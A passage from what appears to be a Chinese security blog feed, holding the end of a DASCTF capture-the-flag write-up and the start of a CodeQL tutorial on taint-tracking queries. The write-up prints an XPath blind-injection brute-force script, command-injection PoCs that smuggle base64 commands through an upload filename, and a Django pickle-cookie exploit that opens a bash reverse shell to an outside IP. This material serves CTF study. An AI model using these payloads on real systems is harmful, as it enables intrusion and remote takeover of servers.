class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>此处要先想办法获取 admin 的用户名和密码，但是这里的 xml 并不是我们可控的，所以用 xpath 盲注打，参考 </p><p><a class="link" href="https://www.cnblogs.com/karsa/p/13439673.html">NPUCTF2020 ezlogin<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url =<span class="string">&#x27;http://d5dc6fdb-a73b-409d-8b67-121d712142dd.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strs =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测根节点名称</span></span><br><span class="line">        <span class="comment"># payload_1 = &#123;&quot;username&quot;:&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&quot;.format(i,j),&quot;password&quot;:123&#125;</span></span><br><span class="line">        <span class="comment">#猜测子节点名称</span></span><br><span class="line">        <span class="comment"># payload_2 = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测accounts的节点</span></span><br><span class="line">        <span class="comment"># payload_3 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测user节点</span></span><br><span class="line">        <span class="comment"># payload_4 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#跑用户名和密码</span></span><br><span class="line">        <span class="comment"># payload_username =&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;.format(i,j)</span></span><br><span class="line">        payload_username =<span class="string">&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload_username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">123</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># payload_password =&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(payload_username)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;登录成功&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;登录失败&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>爆出来的是 <code>admin/003d7628772d6b57fec5f30ccbc82be1</code></p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/md5.png" class><p>md5 解密出来为 15035371139</p><p>登录成功之后能够看到一个文件上传的功能点，简单尝试一番后，看到 File 这个类里面的 <code>__destruct</code> 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>命令拼接，注入</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/commandInjection.png" class><p>PoC</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary79w3gAbWOTtwjVx2</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;;echo bHMgLwo|base64 -d|bash;ajpg.jpg&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">------WebKitFormBoundary79w3gAbWOTtwjVx2--</span><br></pre></td></tr></table></figure><p>进一步构造 PoC</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary6xM5F6Mo0Mgc9vhp</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;;echo Y2F0IC9hZGphc2tkaG5hc2tfZmxhZ19pc19oZXJlX2Rha2pkbm1zYWtqbmZrc2Q=|base64 -d|bash;user.jpg&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/octet-stream</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">------WebKitFormBoundary6xM5F6Mo0Mgc9vhp--</span><br></pre></td></tr></table></figure><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/flag3.png" class><h2 id="ez-py"><a href="#ez-py" class="headerlink" title="ez_py"></a>ez_py</h2><p>下发的附件也比较简单，代码方面没有什么太多可以说的东西，没什么问题。去看一下 setting.py，其中有一段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ROOT_URLCONF = <span class="string">&#x27;openlug.urls&#x27;</span></span><br><span class="line"><span class="comment"># for database performance</span></span><br><span class="line">SESSION_ENGINE = <span class="string">&#x27;django.contrib.sessions.backends.signed_cookies&#x27;</span></span><br><span class="line"><span class="comment"># use PickleSerializer</span></span><br><span class="line">SESSION_SERIALIZER = <span class="string">&#x27;django.contrib.sessions.serializers.PickleSerializer&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SECURITY WARNING: keep the secret key used in production non-secret!</span></span><br><span class="line">SECRET_KEY = <span class="string">&#x27;p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SECURITY WARNING: don&#x27;t run with debug turned on in production!</span></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">ALLOWED_HOSTS = [<span class="string">&quot;*&quot;</span>]</span><br></pre></td></tr></table></figure><p>secret_key 直接给出来了，很明显是关于 session 的一系列操作，结合 Pickle，大概率就是 Pickle 在 session 处的伪造了。</p><p>去到对应的方法，这里默认传参是 JSONSerializer，尝试修改为 PickleSerializer</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/dumpsCore.png" class><p>构造 EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&#x27;p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn&#x27;</span></span><br><span class="line">salt = <span class="string">&quot;django.contrib.sessions.backends.signed_cookies&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> django.core.signing</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleSerializer</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Simple wrapper around pickle to be used in signing.dumps and</span></span><br><span class="line"><span class="string">    signing.loads.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dumps</span>(<span class="params">self, obj</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.loads(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Command</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.Popen, ((<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/124.222.21.138/7777 &lt;&amp;1&quot;&#x27;</span>,),-<span class="number">1</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">False</span>, <span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">out_cookie= django.core.signing.dumps(</span><br><span class="line">    Command(), key=SECRET_KEY, salt=salt, serializer=PickleSerializer)</span><br><span class="line"><span class="built_in">print</span>(out_cookie)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;有点赶，含一道复现&lt;/p&gt;</summary>
    
    
    
    <category term="WP" scheme="https://drun1baby.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://drun1baby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 学习</title>
    <link href="https://drun1baby.github.io/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/"/>
    <id>https://drun1baby.github.io/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-07-31T06:02:02.000Z</published>
    <updated>2023-09-15T06:38:27.590Z</updated>
    
    <content type="html"><![CDATA[<p>codeql 学习记录</p><span id="more"></span><ul><li>大部分内容参考自淚笑师傅的博客</li><li><a class="link" href="https://l3yx.github.io/2022/03/05/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">https://l3yx.github.io/2022/03/05/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0<i class="fas fa-external-link-alt"></i></a></li></ul><p>个人在学习完之后再回过头来看，感觉上是不应该先看这个内容，这个内容还是有点偏入门与进阶之间的难度。从入门角度来说可以先看这篇文章 <a class="link" href="https://www.freebuf.com/articles/web/283795.html">CodeQL从入门到放弃<i class="fas fa-external-link-alt"></i></a></p><p>我个人也会在后续写一些关于 CodeQL 入门类的文章</p><h2 id="0x01-环境-x2F-安装"><a href="#0x01-环境-x2F-安装" class="headerlink" title="0x01 环境&#x2F;安装"></a>0x01 环境&#x2F;安装</h2><h3 id="下载-CodeQL-CLI"><a href="#下载-CodeQL-CLI" class="headerlink" title="下载 CodeQL CLI"></a>下载 CodeQL CLI</h3><p><a class="link" href="https://github.com/github/codeql-cli-binaries/releases">https://github.com/github/codeql-cli-binaries/releases<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/codeql-cli.png" class><p>我这里把 <code>/codeql/codeql</code> 的名字改成了 <code>codeql/codeql-cli</code>，添加系统环境变量</p><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/environCodeQL.png" class><p>接着在 Terminal 中输入 <code>codeql</code> 命令验证是否编辑成功</p><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/codeqlCMD.png" class><h3 id="下载包含标准库的工作空间"><a href="#下载包含标准库的工作空间" class="headerlink" title="下载包含标准库的工作空间"></a>下载包含标准库的工作空间</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /xxx/CodeQL/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/github/vscode-codeql-starter.git</span><br><span class="line"><span class="built_in">cd</span> vscode-codeql-starter</span><br><span class="line">git submodule update --init --remote</span><br><span class="line">git submodule update --remote<span class="comment">#定期执行以更新子模块</span></span><br></pre></td></tr></table></figure><h3 id="安装-VSCode-CodeQL-扩展"><a href="#安装-VSCode-CodeQL-扩展" class="headerlink" title="安装 VSCode CodeQL 扩展"></a>安装 VSCode CodeQL 扩展</h3><p>VSCode 商店搜索安装 CodeQL，并在扩展设置中设置 CodeQL 引擎路径 <code>/xxx/CodeQL/codeql-cli/codeql</code></p><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/codeql-Vscode.png" class><h2 id="0x02-运行-CodeQL"><a href="#0x02-运行-CodeQL" class="headerlink" title="0x02 运行 CodeQL"></a>0x02 运行 CodeQL</h2><p>运行 CodeQL 之前需要先构建数据库，这个数据库本质上其实就是源代码的 Target 打包了一下，对应的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create E:\Coding\CodeQL\CodeQLearning\javaCodeQLTest --language=<span class="string">&quot;java&quot;</span> --source-root=E:\Coding\JavaSec\Eliauk --<span class="built_in">command</span>=<span class="string">&quot;mvn clean package -Dmaven.test.skip=true&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;xxx&#x2F;CodeQL&#x2F;databases&#x2F;Test 指定生成的数据库位置<br>  –source-root 项目源码路径<br>  –command 编译命令，PHP 和 Python 等不需要。对于 Maven，Ant 等项目也可以省略</p></blockquote><p>如果没有指定<code>--command</code>，CodeQL 会根据平台的不同，调用<code>./java/tools/autobuild.cmd</code>或<code>./java/tools/autobuild.sh</code> 对项目进行分析。如果该项目的编译工具为 Gradle、Maven 或 Ant，且能找到相应的配置文件。程序就会进入相应的流程，调用相关的编译指令对项目进行编译。CodeQL 会收集项目编译过程中产生的信息，并以此生成数据库。如果不属于 Gradle、Maven、Ant 中任意一种，则报错退出。</p><p>然后用 vscode 中的 QL 部分打开此文件夹</p><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/folderQL.png" class><p>再对这个数据库进行 CodeQL 语句的查询，具体做法如下</p><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/runQueries.png" class><p>查询结果</p><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/qlResult.png" class><h2 id="0x03-一些示例"><a href="#0x03-一些示例" class="headerlink" title="0x03 一些示例"></a>0x03 一些示例</h2><h3 id="Java-污点跟踪"><a href="#Java-污点跟踪" class="headerlink" title="Java 污点跟踪"></a>Java 污点跟踪</h3><h4 id="CodeQL-中-Java-污点跟踪原理"><a href="#CodeQL-中-Java-污点跟踪原理" class="headerlink" title="CodeQL 中 Java 污点跟踪原理"></a>CodeQL 中 Java 污点跟踪原理</h4><p>全局污点跟踪分析要继承 <code>TaintTracking::Configuration</code> 这个类，然后重载 <code>isSource</code> 和<code>isSink</code> 方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">VulConfig() &#123; this = &quot;myConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, &quot;source are&quot;</span><br></pre></td></tr></table></figure><h4 id="以-GetenvSource-URLSink-为例"><a href="#以-GetenvSource-URLSink-为例" class="headerlink" title="以 GetenvSource-URLSink 为例"></a>以 GetenvSource-URLSink 为例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">/**  </span><br><span class="line"> * @kind path-problem  </span><br><span class="line"> */  </span><br><span class="line">  </span><br><span class="line">import java  </span><br><span class="line">import semmle.code.java.dataflow.TaintTracking  </span><br><span class="line">import DataFlow::PathGraph  </span><br><span class="line">  </span><br><span class="line">class GetenvSource extends DataFlow::ExprNode &#123;  </span><br><span class="line">  GetenvSource() &#123;  </span><br><span class="line">    exists(Method m | m = this.asExpr().(MethodAccess).getMethod() |  </span><br><span class="line">      m.hasName(&quot;getenv&quot;) and  </span><br><span class="line">      m.getDeclaringType() instanceof TypeSystem  </span><br><span class="line">    )  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">class URLSink extends DataFlow::ExprNode &#123;  </span><br><span class="line">  URLSink() &#123;  </span><br><span class="line">    exists(Call call |  </span><br><span class="line">      this.asExpr() = call.getArgument(0) and  </span><br><span class="line">      call.getCallee().(Constructor).getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;)  </span><br><span class="line">    )  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">class GetenvToURLTaintTrackingConfig extends TaintTracking::Configuration &#123;  </span><br><span class="line">  GetenvToURLTaintTrackingConfig() &#123; this = &quot;GetenvToURLTaintTrackingConfig&quot; &#125;  </span><br><span class="line">  </span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source instanceof GetenvSource &#125;  </span><br><span class="line">  </span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123; sink instanceof URLSink &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">from GetenvToURLTaintTrackingConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink  </span><br><span class="line">where cfg.hasFlowPath(source, sink)  </span><br><span class="line">select sink, source, sink, &quot;-&quot;</span><br></pre></td></tr></table></figure><h3 id="Python污点跟踪"><a href="#Python污点跟踪" class="headerlink" title="Python污点跟踪"></a>Python污点跟踪</h3><p>以 <code>RemoteFlowSource-FileSystemAccessSink</code> 为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/**  </span><br><span class="line"> * @kind path-problem  </span><br><span class="line"> */  </span><br><span class="line">  </span><br><span class="line">import python  </span><br><span class="line">import semmle.python.dataflow.new.DataFlow  </span><br><span class="line">import semmle.python.dataflow.new.TaintTracking  </span><br><span class="line">import semmle.python.dataflow.new.RemoteFlowSources  </span><br><span class="line">import semmle.python.Concepts  </span><br><span class="line">import DataFlow::PathGraph  </span><br><span class="line">  </span><br><span class="line">class RemoteToFileConfiguration extends TaintTracking::Configuration &#123;  </span><br><span class="line">  RemoteToFileConfiguration() &#123; this = &quot;RemoteToFileConfiguration&quot; &#125;  </span><br><span class="line">  </span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source instanceof RemoteFlowSource &#125;  </span><br><span class="line">  </span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;  </span><br><span class="line">    sink = any(FileSystemAccess fa).getAPathArgument()  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">from RemoteToFileConfiguration cfg, DataFlow::PathNode source, DataFlow::PathNode sink  </span><br><span class="line">where cfg.hasFlowPath(source, sink)  </span><br><span class="line">select sink, source, sink, &quot;-&quot;</span><br></pre></td></tr></table></figure><h2 id="0x04-CodeQL-For-Java"><a href="#0x04-CodeQL-For-Java" class="headerlink" title="0x04 CodeQL For Java"></a>0x04 CodeQL For Java</h2><h3 id="CodeQL-元数据"><a href="#CodeQL-元数据" class="headerlink" title="CodeQL 元数据"></a>CodeQL 元数据</h3><p><a class="link" href="https://codeql.github.com/docs/writing-codeql-queries/metadata-for-codeql-queries/">CodeQL查询的元数据<i class="fas fa-external-link-alt"></i></a>作为 QLDoc 注释的内容包含在每个查询文件的顶部。此元数据告诉 LGTM 和<a class="link" href="https://codeql.github.com/docs/codeql-for-visual-studio-code/#codeql-for-visual-studio-code">VSCode 的 CodeQL 插件<i class="fas fa-external-link-alt"></i></a>如何处理查询并正确显示其结果。</p><ul><li>例如：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/**  </span><br><span class="line">* @name Empty block  </span><br><span class="line">* @kind problem  </span><br><span class="line">* @problem.severity warning  </span><br><span class="line">* @id java/example/empty-block  </span><br><span class="line">*/  </span><br><span class="line">  </span><br><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from BlockStmt b  </span><br><span class="line">where b.getNumStmt() = 0  </span><br><span class="line">select b, &quot;This is an empty block.&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/**  </span><br><span class="line"> * @kind path-problem  </span><br><span class="line"> */</span><br></pre></td></tr></table></figure><h3 id="Java-代码的基础查询"><a href="#Java-代码的基础查询" class="headerlink" title="Java 代码的基础查询"></a>Java 代码的基础查询</h3><p>以下查询为查找多余的 <code>if</code> 语句，即 <code>then</code> 分支是空的，如<code>if (...) &#123; &#125;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from IfStmt ifstmt, BlockStmt blockstmt  </span><br><span class="line">where ifstmt.getThen() = blockstmt and  </span><br><span class="line">blockstmt.getNumStmt() = 0  </span><br><span class="line">select ifstmt, &quot;This &#x27;if&#x27; statement is redundant.&quot;</span><br></pre></td></tr></table></figure><p>我们一步步拆解一下语法，首先是 <code>import java</code></p><blockquote><p>import java<br>  导入适用于 Java 的标准 CodeQL 库，每个查询都以一个或多个 <code>import</code> 语句开始</p></blockquote><p>然从定义查询的变量里面取值</p><blockquote><p>from IfStmt ifstmt, BlockStmt blockstmt<br>  定义查询的变量，声明的形式为： <code>&lt;type&gt; &lt;variable name&gt;</code><br>  <a class="link" 